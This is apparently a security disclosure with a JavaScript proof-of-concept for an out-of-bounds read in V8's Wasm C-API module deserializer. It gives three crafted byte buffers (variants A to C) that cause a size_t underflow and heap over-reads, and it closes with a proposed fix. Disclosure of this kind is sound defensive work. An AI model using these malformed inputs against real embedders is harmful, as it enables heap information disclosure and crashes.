// Wasm C-API Module::deserialize — Unbounded LEB Decode + size_t Underflow
//
// File:   src/wasm/c-api.cc:1372
// Symbol: Module::deserialize / wasm_module_deserialize
// CWE:    CWE-125 (Out-of-bounds Read)   Severity: HIGH   Confidence: HIGH
//
// ─── Vulnerability ─────────────────────────────────────────────────────────
//
//  ReadLebU64 (c-api.cc:108-119) has NO end-of-buffer parameter:
//
//    auto ReadLebU64(const byte_t** pos) -> uint64_t {
//      uint64_t n = 0, shift = 0;  byte_t b;
//      do {
//        b = **pos;          // ← no bounds check here
//        (*pos)++;
//        n += (b & 0x7f) << shift;
//        shift += 7;
//      } while ((b & 0x80) != 0);  // continues while high bit set
//      return n;
//    }
//
//  Module::deserialize (c-api.cc:1361-1399) uses it unguarded:
//
//    const byte_t* ptr = serialized.get();
//    size_t binary_size = static_cast<size_t>(ReadLebU64(&ptr));  // [1]
//    ptrdiff_t size_size = ptr - serialized.get();
//    size_t serial_size = serialized.size() - size_size - binary_size; // [2]
//    UniqueArray wire_bytes = UniqueCopyOf(ptr, binary_size);           // [3]
//    if (serial_size > 0) {
//        DeserializeNativeModule({ptr + binary_size, serial_size}, ...); // [4]
//    }
//
//  [1] LEB decode with no end pointer — reads past buffer if last byte has
//      high bit set (0x80).
//  [2] size_t underflow when binary_size > remaining_bytes.
//  [3] OOB heap read of binary_size bytes starting at ptr, only
//      (serialized.size() - size_size) bytes are valid.
//  [4] DeserializeNativeModule receives a claimed-SIZE_MAX-byte slice whose
//      begin() pointer is past the buffer end. Every subsequent Reader::Read
//      is DCHECK-guarded (stripped in release) → deeply OOB.
//
// ─── C-API serialize format ────────────────────────────────────────────────
//
//  Module::serialize() (c-api.cc:1327-1358) produces:
//
//    [ LEB_u64(wire_bytes.size) | wire_bytes | serialized_native_module ]
//     ^                          ^             ^
//     size_size bytes             binary_size   serial_size bytes
//     (1-10 bytes)
//
//  This format is distinct from d8.wasm.serializeModule() which embeds no
//  wire bytes.  Module::deserialize is only reachable through:
//    • C API:    wasm_module_deserialize(store, &bytes)
//    • C++ API:  wasm::Module::deserialize(store, serialized_vec)
//    • Shared module path: Module::share() / Module::obtain()
//
// ─── Attack variants ──────────────────────────────────────────────────────
//
// VARIANT A: size_t underflow → DeserializeNativeModule OOB (most severe)
//   Craft a buffer where binary_size > (serialized.size() - size_size):
//
//     Buffer (5 bytes): [ 0x06, AA, BB, CC, DD ]
//       ReadLebU64: byte 0 = 0x06, high bit clear → binary_size = 6, size_size = 1
//       serial_size = 5 - 1 - 6 = SIZE_MAX - 1    ← UNDERFLOW
//       UniqueCopyOf(ptr=&buf[1], 6): reads 2 bytes past the 5-byte buffer
//       serial_size > 0 → DeserializeNativeModule({&buf[7], SIZE_MAX-1})
//         &buf[7] is 2 bytes PAST the allocation
//         claimed size = 18446744073709551614 bytes
//         HeaderMatches reads 28 bytes from &buf[7] → OOB
//         If HeaderMatches passes (unlikely, treated as rejection) → Reader
//         advances SIZE_MAX bytes beyond buf → arbitrary heap read
//
// VARIANT B: Huge LEB value → allocation failure / 2^63-byte OOB read
//   10-byte LEB encoding 2^63:
//     [ 0x80,0x80,0x80,0x80,0x80,0x80,0x80,0x80,0x80,0x01 ]
//   ReadLebU64 reads all 10 bytes legitimately; binary_size = 2^63.
//   UniqueCopyOf(ptr, 2^63) → new uint8_t[2^63]:
//     If allocator returns nullptr → memcpy nullptr → crash
//     If system has memory → OOB read of ~9.2 × 10^18 bytes from ptr
//   serial_size = 10 - 10 - 2^63 → SIZE_MAX truncated → huge
//   DeserializeNativeModule({ptr + 2^63, SIZE_MAX_or_huge}) → deeply OOB
//
// VARIANT C: ReadLebU64 past buffer end (bug [1] alone)
//   Buffer (1 byte): [ 0x80 ]
//     ReadLebU64 reads byte 0 = 0x80, high bit set → continues.
//     Reads byte 1 (1 byte PAST the 1-byte buffer) from heap.
//     If byte 1 also has high bit set → reads byte 2, etc.
//     ReadLebU64 produces whatever LEB value emerges from adjacent heap bytes.
//     The number of OOB bytes read = length of continuation run in heap.
//
//   This is an information-disclosure primitive: heap bytes adjacent to the
//   serialized buffer are silently consumed as LEB continuation bytes.
//
// ─── LEB encoding reference (for crafting attack buffers) ──────────────────
'use strict';

// LEB U64 encoder matching LEBHelper::write_u64v (leb-helper.h:57-63)
function lebEncodeU64(val) {
  const bytes = [];
  while (val >= 0x80n) {
    bytes.push(Number(0x80n | (val & 0x7Fn)));
    val >>= 7n;
  }
  bytes.push(Number(val & 0x7Fn));
  return new Uint8Array(bytes);
}

// LEB U64 decoder matching ReadLebU64 (c-api.cc:108-119)
function lebDecodeU64(buf, offset = 0) {
  let n = 0n, shift = 0n;
  let pos = offset;
  let b;
  do {
    if (pos >= buf.length) {
      print(`  [OOB] ReadLebU64 reads past buffer at offset ${pos} (buf.size=${buf.length})`);
      // In real code this reads adjacent heap memory — we just stop here
      break;
    }
    b = BigInt(buf[pos++]);
    n += (b & 0x7Fn) << shift;
    shift += 7n;
  } while ((b & 0x80n) !== 0n);
  return { value: n, bytes_consumed: pos - offset };
}

print('=== LEB encoding reference ===');
for (const v of [0n, 1n, 127n, 128n, 300n, 0x7Fn, 0x80n, 0xFFFFn, 0xFFFFFFFFn]) {
  const enc = lebEncodeU64(v);
  const dec = lebDecodeU64(enc);
  print(`  LEB(${v}) = [${[...enc].map(b=>b.toString(16).padStart(2,'0')).join(' ')}]  (${enc.length} byte${enc.length>1?'s':''})`);
}

// ─── VARIANT A: craft the attack buffer ─────────────────────────────────────
print('\n=== VARIANT A: size_t underflow via oversized binary_size ===');

{
  // Minimal 5-byte buffer: LEB encodes 6 but only 4 bytes follow
  const buf = new Uint8Array([0x06, 0xAA, 0xBB, 0xCC, 0xDD]);
  const { value: binary_size, bytes_consumed: size_size } = lebDecodeU64(buf);
  const remaining = buf.length - size_size;
  const serial_size_signed = buf.length - size_size - Number(binary_size);
  const serial_size_u64 = BigInt(buf.length - size_size) - binary_size;
  // serial_size as unsigned 64-bit (simulating size_t wrapping)
  const SIZE_MAX = (1n << 64n) - 1n;
  const serial_size = serial_size_u64 < 0n ? SIZE_MAX + serial_size_u64 + 1n : serial_size_u64;

  print(`  Buffer:       [${[...buf].map(b=>b.toString(16).padStart(2,'0')).join(' ')}]  (${buf.length} bytes)`);
  print(`  binary_size:  ${binary_size}  (from LEB at byte 0)`);
  print(`  size_size:    ${size_size}  (bytes consumed by LEB)`);
  print(`  remaining:    ${remaining}  (bytes available for wire_bytes)`);
  print(`  serial_size:  ${serial_size}  ← 0x${serial_size.toString(16).toUpperCase()}`);
  print(`                (underflow: ${buf.length} - ${size_size} - ${binary_size} → SIZE_MAX - ${Number(binary_size) - remaining - 1})`);
  print('');
  print('  Impact:');
  print(`  [3] UniqueCopyOf(&buf[${size_size}], ${binary_size}): OOB reads ${Number(binary_size) - remaining} bytes past buf end`);
  print(`      Copies adjacent heap bytes into wire_bytes array`);
  print(`  [4] serial_size > 0 → DeserializeNativeModule called`);
  print(`      data.begin() = &buf[${size_size + Number(binary_size)}]  (${Number(binary_size) - remaining} bytes PAST allocation)`);
  print(`      data.size()  = ${serial_size}  (0x${serial_size.toString(16)})`);
  print(`      HeaderMatches reads 28 bytes from that wild pointer`);
  print(`      If header doesn't match → returns {} (but OOB read already done)`);
  print(`      If header matches (improbable) → full DCHECK-stripped reader OOB`);
}

// ─── VARIANT B: huge LEB value ───────────────────────────────────────────────
print('\n=== VARIANT B: huge binary_size (2^63) → allocation failure / OOB ===');

{
  // 10 bytes encodes 2^63 = 0x8000000000000000
  const val = (1n << 63n);
  const enc = lebEncodeU64(val);
  print(`  LEB(2^63) = [${[...enc].map(b=>b.toString(16).padStart(2,'0')).join(' ')}]  (${enc.length} bytes)`);
  print(`  After decode: binary_size = ${val}  (${enc.length} bytes consumed)`);
  const buf_size = BigInt(enc.length) + 2n;  // 12-byte total buffer
  const serial_size_u64 = buf_size - BigInt(enc.length) - val;
  const SIZE_MAX = (1n << 64n) - 1n;
  const serial_size = serial_size_u64 < 0n ? SIZE_MAX + serial_size_u64 + 1n : serial_size_u64;
  print(`  Buffer size:  ${buf_size} bytes  (10 LEB + 2 dummy)`);
  print(`  serial_size:  ${serial_size}  ← 0x${serial_size.toString(16).slice(-16).toUpperCase()}`);
  print('');
  print('  Impact:');
  print(`  UniqueCopyOf(ptr, 9223372036854775808): new uint8_t[2^63] likely fails`);
  print(`    → V8 allocator returns nullptr or throws std::bad_alloc → crash`);
  print(`    If allocation somehow succeeds: memcpy reads 2^63 bytes from heap`);
  print(`  DeserializeNativeModule({ptr + 2^63, ${serial_size}}) → deeply OOB`);
}

// ─── VARIANT C: ReadLebU64 past buffer boundary ──────────────────────────────
print('\n=== VARIANT C: ReadLebU64 OOB read of LEB continuation bytes ===');

{
  // 1-byte buffer with continuation bit set
  const buf = new Uint8Array([0x80]);
  print(`  Buffer:  [80]  (1 byte, high bit set → ReadLebU64 reads next byte)`);
  print('  ReadLebU64: byte 0 = 0x80 (high bit set, partial value 0)');
  print('              → reads byte 1 from adjacent heap memory (OOB!)');
  print('              If byte 1 also has high bit set → reads byte 2, etc.');
  print('  INFORMATION DISCLOSURE: heap bytes after the allocation are consumed');
  print('  as LEB continuation bytes and may influence binary_size / serial_size.');
  const dec = lebDecodeU64(buf, 0);  // our safe decoder stops at OOB
}

// ─── Summary ─────────────────────────────────────────────────────────────────
print('\n── Root Cause ───────────────────────────────────────────────────────────');
print(' File:     src/wasm/c-api.cc');
print(' Function: Module::deserialize / wasm_module_deserialize');
print(' Line:     1369  binary_size = ReadLebU64(&ptr)       ← no end pointer');
print('           1371  serial_size = size() - size_size - binary_size  ← underflow');
print('           1372  UniqueCopyOf(ptr, binary_size)       ← OOB read');
print('           1384  DeserializeNativeModule({ptr+binary_size, serial_size})  ← OOB');
print('');
print(' ReadLebU64 (line 108):');
print('   do { b = **pos; (*pos)++; ... } while (b & 0x80)   ← no bounds check');
print('');
print(' Attack surface:');
print('   Any embedder using the Wasm C API that deserializes module bytes');
print('   from an untrusted source (file, network, IPC):');
print('     wasm_module_deserialize(store, &bytes)');
print('     wasm::Module::deserialize(store, serialized_vec)');
print('   Also: Module::share() / Module::obtain() (c-api.cc:1409-1416)');
print('     which calls Module::deserialize on the shared bytes.');
print('');
print(' Fix:');
print('   Add an end pointer to ReadLebU64:');
print('     auto ReadLebU64(const byte_t** pos, const byte_t* end) -> uint64_t');
print('     { ... if (*pos >= end) return error; ... }');
print('   Validate before computing serial_size:');
print('     if (size_size + binary_size > serialized.size()) return nullptr;');
print('   Both fixes are present in Chromium\'s similar paths (src/inspector,');
print('   src/wasm/decoder.h class Decoder which carries a start/end range).');
print('');
print(' Note: The C++ PoC that calls Module::deserialize directly is in');
print('   capi_leb_oob_poc.cc (requires V8 built as a shared library).');
print('');
print(' CWE-125 (Out-of-bounds Read)   Severity: HIGH   Confidence: HIGH');
